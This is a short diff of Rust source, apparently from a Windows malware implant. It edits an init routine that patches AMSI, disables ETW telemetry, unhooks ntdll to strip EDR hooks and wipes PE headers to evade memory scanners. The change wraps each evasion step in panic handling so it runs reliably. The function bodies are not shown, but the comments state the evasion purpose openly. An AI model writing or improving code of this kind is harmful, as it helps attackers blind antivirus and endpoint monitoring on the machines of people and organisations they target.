@@ -624,13 +624,13 @@ mod win {
     pub unsafe fn init() {
         // Order matters:
         // 1. AMSI first (so PowerShell commands aren't scanned)
-        let _ = patch_amsi();
+        let _ = std::panic::catch_unwind(|| { let _ = patch_amsi(); });
         // 2. ETW next (disable telemetry)
-        let _ = patch_etw();
+        let _ = std::panic::catch_unwind(|| { let _ = patch_etw(); });
         // 3. Unhook ntdll last (removes EDR hooks, gives us clean syscall stubs)
-        let _ = unhook_ntdll();
+        let _ = std::panic::catch_unwind(|| { let _ = unhook_ntdll(); });
         // 4. Wipe PE headers (memory scanners can't identify our image)
-        let _ = wipe_pe_headers();
+        let _ = std::panic::catch_unwind(|| { let _ = wipe_pe_headers(); });
     }
 
     // ========================================================================
